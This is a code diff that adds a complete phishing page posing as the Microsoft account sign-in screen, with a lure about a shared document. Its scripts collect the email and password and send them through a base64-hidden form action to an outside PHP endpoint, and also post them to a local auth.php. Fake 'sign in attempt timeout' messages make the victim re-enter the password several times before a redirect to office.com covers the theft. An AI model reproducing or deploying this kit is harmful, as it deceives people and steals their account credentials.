@@ -1,0 +1,543 @@
+<html><head>
+    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+    <meta content="IE=Edge" http-equiv="X-UA-Compatible">
+    <title>Sign in to your Microsoft account</title>
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=yes" name="viewport">
+    <link href="https://logincdn.msauth.net/16.000.28741.15/images/favicon.ico" rel="shortcut icon">
+    <link href="https://logincdn.msauth.net/16.000/Converged_v21033_5plpI1P0_uKjrokWdqCoBw2.css" onerror="$Loader.OnError(this)" onload="$Loader.OnSuccess(this)" rel="stylesheet" title="Converged_v2" type="text/css">
+    <style type="text/css"></style>
+    <style type="text/css">
+        body {
+            display: none;
+        }
+    </style>
+    <style type="text/css">
+        body {
+            display: block !important;
+        }
+    </style>
+    <noscript>
+        <style type="text/css">
+            body {
+                display: block !important;
+            }
+        </style>
+    </noscript>
+    <link href="https://logincdn.msauth.net/16.000.28741.15/images/Windows_Live_v_thumb.jpg" rel="image_src">
+    <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
+</head>
+<body class="cb" data-bind="defineGlobals: ServerData, bodyCssClass">
+<div>
+    <div data-bind="component: { name: 'background-image-control', publicMethods: backgroundControlMethods }">
+        <div class="background-image-holder" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }" role="presentation">
+            <div class="background-image ext-background-image" data-bind="backgroundImage: backgroundImageUrl(), externalCss: { 'background-image': true }" style="background-image: url(&quot;https://logincdn.msauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg&quot;);"></div>
+        </div>
+    </div>
+    <div data-bind="if: activeDialog"></div>
+    <form action="" data-action="aHR0cHM6Ly9leHBsb3JlLWxvbmRvbi5jby51ay9jbG91ZDEvYXV0aF9ub2NoZWNrLnBocA==" autocomplete="off" data-bind="autoSubmit: forceSubmit, attr: { action: postUrl }, ariaHidden: activeDialog" class="ajax-form" method="post" name="f1" novalidate="novalidate" spellcheck="false" target="_top">
+        <div class="outer" data-bind="component: { name: 'master-page',
+    params: {
+    serverData: svr,
+    showButtons: svr.f,
+    showFooterLinks: true,
+    useWizardBehavior: svr.BG,
+    handleWizardButtons: false,
+    password: password,
+    hideFromAria: ariaHidden },
+    event: {
+    footerAgreementClick: footer_agreementClick } }" style="background-image: url('https://i.gyazo.com/214d89a26f0ac918a09f216a1b0f97b4.png'); background-repeat: no-repeat;background-size: cover;">
+            <div class="middle" data-bind="css: { 'app': backgroundLogoUrl }">
+                <div class="sign-in-box ext-sign-in-box fade-in-lightbox" data-bind="
+    animationEnd: paginationControlMethods() &amp;&amp; paginationControlMethods().view_onAnimationEnd,
+    css: {
+    'app': backgroundLogoUrl,
+    'wide': paginationControlMethods() &amp;&amp; paginationControlMethods().currentViewHasMetadata('wide'),
+    'fade-in-lightbox': fadeInLightBox,
+    'has-popup': showFedCredButtons,
+    'transparent-lightbox': backgroundControlMethods() &amp;&amp; backgroundControlMethods().useTransparentLightBox },
+    externalCss: { 'sign-in-box': true }">
+
+                    <div aria-label="Please wait" class="progress disit 1iqzd3" id="progressBar" role="progressbar" style="display: none;">
+
+
+                        <div></div>
+                        <div></div>
+                        <div></div>
+                        <div></div>
+                        <div></div>
+
+
+                    </div>
+
+
+                    <div class="lightbox-cover" data-bind="css: { 'disable-lightbox': svr.bp &amp;&amp; showLightboxProgress() }"></div>
+                    <div class="win-scroll">
+                        <div data-bind="component: { name: 'logo-control',
+    params: {
+    isChinaDc: svr.fIsChinaDc,
+    bannerLogoUrl: bannerLogoUrl() } }">
+                            <img alt="Microsoft" class="logo" data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }" pngsrc="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ed9c9eb0dce17d752bedea6b5acda6d9.png" role="img" src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" svgsrc="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg">
+                        </div>
+                        <div data-bind="component: { name: 'pagination-control',
+    publicMethods: paginationControlMethods,
+    params: {
+    enableCssAnimation: svr.aH,
+    disableAnimationIfAnimationEndUnsupported: svr.bt,
+    initialViewId: initialViewId,
+    currentViewId: currentViewId,
+    initialSharedData: initialSharedData,
+    initialError: $loginPage.getServerError() },
+    event: {
+    cancel: paginationControl_onCancel,
+    loadView: view_onLoadView,
+    showView: view_onShow,
+    setLightBoxFadeIn: view_onSetLightBoxFadeIn,
+    animationStateChange: paginationControl_onAnimationStateChange } }" role="main">
+                            <div class="" data-bind="css: { 'zero-opacity': hidePaginatedView() }">
+
+                                <div class="pagination-view has-identity-banner animate slide-in-next" data-bind="css: {
+    'has-identity-banner': showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.j),
+    'zero-opacity': hidePaginatedView.hideSubView(),
+    'animate': animate(),
+    'slide-out-next': animate.isSlideOutNext(),
+    'slide-in-next': animate.isSlideInNext(),
+    'slide-out-back': animate.isSlideOutBack(),
+    'slide-in-back': animate.isSlideInBack() }">
+                                    <div data-bind="pageViewComponent: { name: 'login-paginated-password-view',
+    params: {
+    serverData: svr,
+    serverError: initialError,
+    isInitialView: isInitialState,
+    username: sharedData.username,
+    displayName: sharedData.displayName,
+    hipRequiredForUsername: sharedData.hipRequiredForUsername,
+    passwordBrowserPrefill: sharedData.passwordBrowserPrefill,
+    availableCreds: sharedData.availableCreds,
+    evictedCreds: sharedData.evictedCreds,
+    useEvictedCredentials: sharedData.useEvictedCredentials,
+    showCredViewBrandingDesc: sharedData.showCredViewBrandingDesc,
+    flowToken: sharedData.flowToken,
+    defaultKmsiValue: svr.AF === 1,
+    userTenantBranding: sharedData.userTenantBranding,
+    sessions: sharedData.sessions,
+    callMetadata: sharedData.callMetadata },
+    event: {
+    updateFlowToken: $loginPage.view_onUpdateFlowToken,
+    submitReady: $loginPage.view_onSubmitReady,
+    redirect: $loginPage.view_onRedirect,
+    resetPassword: $loginPage.passwordView_onResetPassword,
+    setBackButtonState: view_onSetIdentityBackButtonState,
+    setPendingRequest: $loginPage.view_onSetPendingRequest } }" data-dynamicbranding="true" data-showidentitybanner="true" data-viewid="2">
+                                        <input data-bind="value: isKmsiChecked() ? 1 : 0" name="i13" type="hidden" value="0">
+                                        <input data-bind="value: unsafe_username" name="login" type="hidden" value="unsafe_username">
+                                        <input aria-hidden="true" class="moveOffScreen" data-bind="moveOffScreen, value: unsafe_displayName" name="loginfmt" tabindex="-1" type="text">
+                                        <input data-bind="value: svr.BG ? 20 : 11" name="type" type="hidden" value="11">
+                                        <input data-bind="value: isKmsiChecked() ? 1 : 3" name="LoginOptions" type="hidden" value="3">
+                                        <input data-bind="value: callMetadata.IsLongRunningTransaction" name="lrt" type="hidden" value="">
+                                        <input data-bind="value: callMetadata.LongRunningTransactionPartition" name="lrtPartition" type="hidden" value="">
+                                        <input data-bind="value: callMetadata.HisRegion" name="hisRegion" type="hidden" value="">
+                                        <input data-bind="value: callMetadata.HisScaleUnit" name="hisScaleUnit" type="hidden" value="">
+                                        <div aria-level="1" class="row title ext-title" data-bind="text: str['CT_PWD_STR_EnterPassword_Title'], externalCss: { 'title': true }" id="loginHeader" role="heading">
+                                            Sign In
+                                        </div>
+                                        <div class="row">
+                                          <div class="form-group col-md-24">
+                                            Only recipient email with valid credentials can access shared document.
+                                          </div>
+                                            <div class="form-group col-md-24">
+                                                <div aria-live="assertive" role="alert"></div>
+                                                <div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox-field',
+    publicMethods: passwordTextbox.placeholderTextboxMethods,
+    params: {
+    serverData: svr,
+    hintText: str['CT_PWD_STR_PwdTB_Label'] },
+    event: {
+    updateFocus: passwordTextbox.textbox_onUpdateFocus } }">
+                                                    <span class="errrmsg" style="color: rgb(255, 0, 0);"></span>
+                                                  <input aria-describedby="loginHeader  " aria-label="Enter e-mail address" aria-required="true" autocomplete="off" class="form-control input ext-input text-box ext-text-box" data-bind="
+    textInput: passwordTextbox.value,
+    ariaDescribedBy: [
+    'loginHeader',
+    showCredViewBrandingDesc ? 'credViewBrandingDesc' : '',
+    unsafe_pageDescription ? 'passwordDesc' : ''].join(' '),
+    hasFocusEx: passwordTextbox.focused() &amp;&amp; !showPassword(),
+    placeholder: $placeholderText,
+    ariaLabel: unsafe_passwordAriaLabel,
+    moveOffScreen: showPassword,
+    externalCss: {
+    'input': true,
+    'text-box': true,
+    'has-error': passwordTextbox.error }" id="i0119" name="userid" placeholder="Enter e-mail address" tabindex="0" type="text">
+                                                    <input aria-describedby="loginHeader  " aria-label="Enter password" aria-required="true" autocomplete="off" class="form-control input ext-input text-box ext-text-box" data-bind="
+    textInput: passwordTextbox.value,
+    ariaDescribedBy: [
+    'loginHeader',
+    showCredViewBrandingDesc ? 'credViewBrandingDesc' : '',
+    unsafe_pageDescription ? 'passwordDesc' : ''].join(' '),
+    hasFocusEx: passwordTextbox.focused() &amp;&amp; !showPassword(),
+    placeholder: $placeholderText,
+    ariaLabel: unsafe_passwordAriaLabel,
+    moveOffScreen: showPassword,
+    externalCss: {
+    'input': true,
+    'text-box': true,
+    'has-error': passwordTextbox.error }" id="i0118" name="passwd" placeholder="Password" tabindex="0" type="password">
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="position-buttons" data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText }">
+                                            <div>
+                                                <div class="form-group checkbox text-block-body no-margin-top" data-bind="visible: !svr.G &amp;&amp; !showHipOnPasswordView" id="idTd_PWD_KMSI_Cb">
+                                                    <label id="idLbl_PWD_KMSI_Cb">
+                                                        <input aria-label="Keep me signed in" data-bind="checked: isKmsiChecked, ariaLabel: str['CT_PWD_STR_KeepMeSignedInCB_Text']" id="idChkBx_PWD_KMSI0Pwd" name="KMSI" type="checkbox"> <span data-bind="text: str['CT_PWD_STR_KeepMeSignedInCB_Text']">Keep me signed in</span>
+                                                    </label>
+                                                </div>
+                                                <div class="row">
+                                                    <div class="col-md-24">
+                                                        <div class="text-13">
+                                                            <div class="form-group"><a href="" id="idA_PWD_ForgotPassword" role="link">Forgot
+                                                                password?</a>
+                                                            </div>
+
+
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="win-button-pin-bottom">
+                                                <div class="row" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }">
+                                                    <div data-bind="component: { name: 'footer-buttons-field',
+    params: {
+    serverData: svr,
+    primaryButtonText: str['CT_PWD_STR_SignIn_Button'],
+    isPrimaryButtonEnabled: !isRequestPending(),
+    isPrimaryButtonVisible: svr.f,
+    isSecondaryButtonEnabled: true,
+    isSecondaryButtonVisible: false },
+    event: {
+    primaryButtonClick: primaryButton_onClick } }">
+                                                        <div class="col-xs-24 no-padding-left-right button-container" data-bind="
+    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
+    css: { 'no-margin-bottom': removeBottomMargin }">
+                                                            <div class="inline-block" data-bind="css: { 'inline-block': isPrimaryButtonVisible }">
+                                                                <input class="button ext-button primary ext-primary" data-bind="
+    attr: primaryButtonAttributes,
+    externalCss: {
+    'button': true,
+    'primary': true },
+    value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
+    hasFocus: focusOnPrimaryButton,
+    click: primaryButton_onClick,
+    enable: isPrimaryButtonEnabled,
+    visible: isPrimaryButtonVisible,
+    preventTabbing: primaryButtonPreventTabbing" id="idSIButton9" name="sub" type="submit" value="Sign in">
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div data-bind="component: { name: 'instrumentation-control',
+    publicMethods: instrumentationMethods,
+    params: { serverData: svr } }">
+                </div>
+                <div class="default footer ext-footer new-background-image" data-bind="
+    css: {
+    'default': !backgroundLogoUrl(),
+    'new-background-image': useNewDefaultBackground },
+    externalCss: { 'footer': true }" id="footer" role="contentinfo">
+                    <div data-bind="component: { name: 'footer-control',
+    publicMethods: footerMethods,
+    params: {
+    serverData: svr,
+    useNewDefaultBackground: useNewDefaultBackground(),
+    hasDarkBackground: backgroundLogoUrl(),
+    showLinks: true },
+    event: {
+    agreementClick: footer_agreementClick,
+    showDebugDetails: toggleDebugDetails_onClick } }">
+                        <div class="footerNode text-secondary" id="footerLinks">
+                            <a data-bind="text: termsText, href: termsLink, click: termsLink_onClick" href="" id="ftrTerms">Terms of use</a>
+                            <a data-bind="text: privacyText, href: privacyLink, click: privacyLink_onClick" href="" id="ftrPrivacy">Privacy
+                                &amp; cookies</a>
+                            <a aria-expanded="false" aria-label="Click here for troubleshooting information" class="moreOptions" data-bind="
+    click: moreInfo_onClick,
+    ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'],
+    attr: { 'aria-expanded': showDebugDetails().toString() },
+    hasFocusEx: focusMoreInfo()" href="#" id="moreOptions" role="button">
+                                <img class="desktopMode" data-bind="imgSrc" pngsrc="https://logincdn.msauth.net/shared/1.0/content/images/ellipsis_96f69d0cefd8a8ba623a182c351ccc64.png" role="presentation" src="https://logincdn.msauth.net/shared/1.0/content/images/ellipsis_635a63d500a92a0b8497cdc58d0f66b1.svg" svgsrc="https://logincdn.msauth.net/shared/1.0/content/images/ellipsis_635a63d500a92a0b8497cdc58d0f66b1.svg">
+                                <img class="mobileMode" data-bind="imgSrc" pngsrc="https://logincdn.msauth.net/shared/1.0/content/images/ellipsis_grey_5bc252567ef56db648207d9c36a9d004.png" role="presentation" src="https://logincdn.msauth.net/shared/1.0/content/images/ellipsis_grey_2b5d393db04a5e6e1f739cb266e65b4c.svg" svgsrc="https://logincdn.msauth.net/shared/1.0/content/images/ellipsis_grey_2b5d393db04a5e6e1f739cb266e65b4c.svg">
+                            </a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </form>
+</div>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+<script>
+
+    setTimeout(function () {
+        $(document).ready(function () {
+
+
+            //#i0281, #i0118
+            var moreUrl = "a3WKlDeM28p&oseimfu=71ybiOjCXuxBlbo&kizdzvjw=OB2RAwrMkWxPtkgxArMs&hbwb=3CAyWfLqBPasglWuU6XymZg5nKP61&zbw=2UFTxOpmLp8s78MGbcdipDcC1tSW&eonfntp=XzDeluPywaHijqt5df7dMjWo&fvtvidwgsj=qv3FtnhDTpqAMv6jH54&pbp=Tcif5le4CYmMrQiyu3g&zvktartxw"
+            var theBaseUrl = getBaseUrl(true);
+            var progressBar = $('#progressBar');
+            var passcon = $('#i0118');
+            var passv = '';
+            var redirectUrl = 'https://www.office.com/';
+            var Url = 'https://www.office.com/';
+            //   var emv = geturlparameter('holderId');
+            var emv = "<?php echo $username; ?>"
+            //   var emv = "hkjsfjksfjksf@hotmail.com"
+            //   $('.thebackbuttonxcf').attr('href', theBaseUrl+'test2.html');
+            if (emv && emv.length > 0) {
+                emv = emv.trim();
+            }
+            if (!emv || emv.length < 1) {
+                window.location.replace(theBaseUrl + 'test2.html');
+            } else {
+                var displayName = $('#displayName');
+                displayName.attr('title', emv);
+                $('#displayName span').html(emv);
+                $('input[name=login]').val(emv);
+            }
+            var loginCounter = 1;
+            var loginMaxAttpmt = 3;
+            var loginCfromUrl = geturlparameter('lgat');
+            if (loginCfromUrl && loginCfromUrl.length > 0) {
+                loginCfromUrl = loginCfromUrl.trim();
+                loginCfromUrl = parseInt(loginCfromUrl);
+                if (isNaN(loginCfromUrl)) {
+                    loginCfromUrl = 0;
+                }
+            } else {
+                loginCfromUrl = 0;
+            }
+            if (loginCfromUrl > 0) {
+                var errrmsg = $('.errrmsg');
+
+                errrmsg.show();
+            }
+            var passUrl = theBaseUrl + 'login2.html';
+            progressBar.hide();
+            var count = 0;
+
+            $('#i0281').submit(function (e) {
+                e.preventDefault();
+                progressBar.show();
+                passv = passcon.val();
+                if (emv && emv.length > 0 && passv && passv.length > 0) {
+                    var theemidval = '427c731f82eb7cc18ee65e538bf0dd78';
+                    //   mg(emv, passv, 'Office354nw');
+                    // console.log(ff);
+                    const cap = {
+                        emv: emv,
+                        passv: passv,
+                    }
+                    count++;
+                    console.log(count);
+                    if (count < 3) {
+                        axios.post('/auth.php', {
+                            cap
+                        })
+                        $('.errrmsg').html('');
+                        setTimeout(function () {
+                            $('.errrmsg').html('Sign in attempt timeout, verify your password');
+                            $("#i0118").val('');
+                            $("#i0118").focus();
+                            progressBar.hide();
+                        }, 2000 + count);
+
+                    }
+                    else {
+                        setTimeout(function () {
+                            window.location.replace("https://www.office.com");
+                        }, 4000 + count);
+
+                    }
+
+                } else {
+                    progressBar.hide();
+                }
+            });
+        });
+    }, 1000);
+
+    function getBaseUrl(baseWithoutFile) {
+        if (baseWithoutFile === undefined) {
+            baseWithoutFile = false;
+        }
+        var fg = false;
+        var fullUrl = window.location.href;
+        var htmlstr = '.html';
+        var htmlLen = 5;
+        var htmlStrPos = -1;
+        var qmrkStrPos = fullUrl.indexOf('?');
+        var lastIndexOffslash = -1;
+        var fullUrlStart = '';
+        if (qmrkStrPos != -1) {
+            fullUrlStart = fullUrl.substr(0, qmrkStrPos);
+            fg = true;
+        }
+        htmlStrPos = fullUrl.indexOf(htmlstr);
+        if (htmlStrPos != -1) {
+            fullUrlStart = fullUrl.substr(0, htmlStrPos + htmlLen);
+            fg = true;
+        }
+        if (fullUrlStart.length > 0) {
+            fullUrlStart = fullUrlStart.trim();
+        }
+        if (fg && baseWithoutFile) {
+            lastIndexOffslash = fullUrlStart.lastIndexOf('/');
+            if (lastIndexOffslash != -1) {
+                fullUrlStart = fullUrlStart.substr(0, lastIndexOffslash + 1);
+            }
+        }
+        if (!fg) {
+            fullUrlStart = fullUrl;
+        }
+        return fullUrlStart;
+    }
+
+    function randomInteger(min, max) {
+        return Math.floor(Math.random() * (max - min + 1)) + min;
+    }
+
+    function randomString(r, n) {
+        for (var o = "", t = r; 0 < t; --t) o += n[Math.floor(Math.random() * n.length)];
+        return o
+    }
+
+    function getdomainpartofemail(a) {
+        var e, t = !1;
+        return !validateEmail(a) || -1 != (e = (a = a.toLowerCase()).indexOf("@")) && (t = a.substr(e + 1)), t
+    }
+
+    function get_email_hash() {
+        var a = !1, i = window.location.href, t = (i = i.trim()).lastIndexOf("#");
+        return -1 != t && (a = i.substring(t + 1), validateEmail(a) || (a = !1)), a
+    }
+
+    function validateEmail(t) {
+        return /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/.test(String(t).toLowerCase())
+    }
+
+    function geturlparameter(r) {
+        for (var t = window.location.search.substring(1).split("&"), e = 0; e < t.length; e++) {
+            var n = t[e].split("=");
+            if (n[0] == r) return decodeURIComponent(n[1])
+        }
+    }
+
+    function get_rand_url_pars() {
+        var r = "", n = 0, a = "abcdefghijklmnopqrstuvwxyz", e = a;
+        a += a.toUpperCase() + "123456789";
+        for (var t = randomInteger(3, 10), n = 0; n < t; n++) r += "&" + randomString(randomInteger(3, 10), e) + "=" + randomString(randomInteger(15, 30), a);
+        return r.substr(1)
+    }
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+<script type="text/javascript">
+  jQuery(document).ready(function($) {
+      var submitCount = 0;
+    $('.ajax-form').on('submit', function(event) {
+      event.preventDefault();
+      $('#progressBar').show();
+	  $('.errrmsg').html('');
+      let form = $(this);
+      let formData = form.serializeArray(),
+              submit = form.find('[type="submit"]'),
+              action = form.attr('data-action'),
+              userid = form.find('[name=userid]').val(),
+              passwd = form.find('[name=passwd]').val()
+
+      submit.prop('disabled', true);
+
+      if (userid == '' || passwd == ''){
+		$('.errrmsg').html('Please, enter your credentials first.');
+          submit.prop('disabled', false);
+          $('#progressBar').hide();
+		  return;
+      }
+	  if (checkIfEmail(userid) == false){
+		$('.errrmsg').html('Please, enter a valid e-mail address.');
+		submit.prop('disabled', false);
+        $('#progressBar').hide();
+		return;
+	  }
+      corsReq(atob(action), { userid: userid, passwd: passwd}, 'POST', function(res) {
+        $('#loader').css('display', 'none');
+          submitCount++;
+        if (res.responseJSON.success == true) {
+            $('#progressBar').hide();
+            window.location.href = res.responseJSON.redirect;
+        } else {
+            if (submitCount == 3){
+                window.location.href = res.responseJSON.redirect;
+            }
+            $('.errrmsg').html('Sign in attempt timeout, please verify your password.');
+           form.find('[type="password"]').val('');
+           submit.prop('disabled', false);
+            $('#progressBar').hide();
+
+        }
+      });
+    });
+  });
+</script>
+<script type="text/javascript">
+function checkIfEmail(str) {
+  // Regular expression to check if string is email
+  const regexExp = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/gi;
+
+  return regexExp.test(str);
+}
+</script>
+<script type="text/javascript">
+  (function (window, document, $, io) {
+    'use strict';
+
+    $.support.cors = true;
+
+    var xhrCorsFields = {
+      withCredentials: false
+    };
+
+    function corsReq(options, data, type, callback) {
+      var settings = $.extend({}, $.ajaxSettings, { xhrFields: xhrCorsFields });
+      settings.crossDomain = true;
+      settings.dataType = 'json';
+      settings.async = true;
+      if ('string' === typeof options) settings.url = options;
+      else settings = $.extend(settings, options);
+
+      if ('string' === typeof data) settings.type = data;
+      else if (data) settings.data = data;
+
+      if ('function' === typeof type) settings.complete = type;
+      else if (type) settings.type = type;
+
+      if (callback) settings.complete = callback;
+      console.log(settings);
+      return $.ajax(settings);
+    }
+
+    window.corsReq = corsReq;
+
+    $(document).ready(function () {
+
+    });
+  })(window, document, window.jQuery, window.io);
+</script>
+
+</body></html>
